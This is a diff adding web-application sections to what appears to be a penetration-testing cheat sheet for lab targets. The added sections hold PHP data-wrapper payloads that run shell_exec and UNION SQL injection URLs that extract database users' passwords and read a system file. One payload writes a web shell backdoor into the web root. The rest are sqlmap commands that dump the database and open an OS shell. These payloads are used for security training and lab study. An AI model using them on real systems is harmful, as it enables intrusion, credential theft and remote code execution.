@@ -211,7 +211,46 @@ dirb http://www.megacorpone.com -r -z 10
 nikto -host=http://www.megacorpone.com -maxtime=30s
 ```
 
-### **sqlmap**
+## Web application
+
+### Web Servers
+
+```
+python -m SimpleHTTPServer 7331
+python3 -m http.server 7331
+php -S 0.0.0.0:8000
+ruby -run -e httpd . -p 9000
+busybox httpd -f -p 10000
+```
+
+#### PHP Wrappers
+
+```
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+
+### SQL Injection
+
+#### Extracting Data from the Database
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
+```
+
+#### From SQL Injection to Code Execution
+
+```
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+
+```
+
+#### **sqlmap**
 
 in google chrome, open network, select call and and copy request header, paste it to a file req.txt
 
@@ -219,7 +258,13 @@ in google chrome, open network, select call and and copy request header, paste i
 sqlmap -r req.txt 
 ```
 
-## Web application
+other examples:
+
+```
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+```
 
 ### Cross-Site Scripting (XSS)
 
